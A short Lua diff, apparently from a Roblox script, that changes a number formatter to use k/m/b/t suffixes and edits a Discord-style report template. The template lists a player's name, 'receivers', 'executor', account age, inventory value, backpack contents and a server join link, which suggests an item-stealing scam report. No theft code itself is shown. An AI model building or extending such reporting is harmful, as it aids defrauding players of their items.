@@ -213,13 +213,21 @@ local function formatNumber(number)
     if number == nil then
         return "0"
     end
-    local formatted = tostring(math.floor(number))
-    local sign, int, frac = formatted:match('^([%-]?)(%d+)(%.?%d*)$')
-    int = int:reverse():gsub("(%d%d%d)", "%1,"):reverse()
-    if int:sub(1,1) == "," then
-        int = int:sub(2)
+    local suffixes = {"", "k", "m", "b", "t"}
+    local suffixIndex = 1
+    while number >= 1000 and suffixIndex < #suffixes do
+        number = number / 1000
+        suffixIndex = suffixIndex + 1
     end
-    return sign .. int .. frac
+    if suffixIndex == 1 then
+        return tostring(math.floor(number))
+    else
+        if number == math.floor(number) then
+            return string.format("%d%s", number, suffixes[suffixIndex])
+        else
+            return string.format("%.2f%s", number, suffixes[suffixIndex])
+        end
+    end
 end
 
 -- Update number formatting to always use commas and full numbers
@@ -337,6 +345,7 @@ Account Age: %s days```
 ```%s```
 :island: **Join with URL**
 **%s
+
 -# %s | %s**
 ]], playerName, receivers, executor, accountAge, totalValueStr, backpackStr, joinUrlMarkdown, placeId, jobId)
 
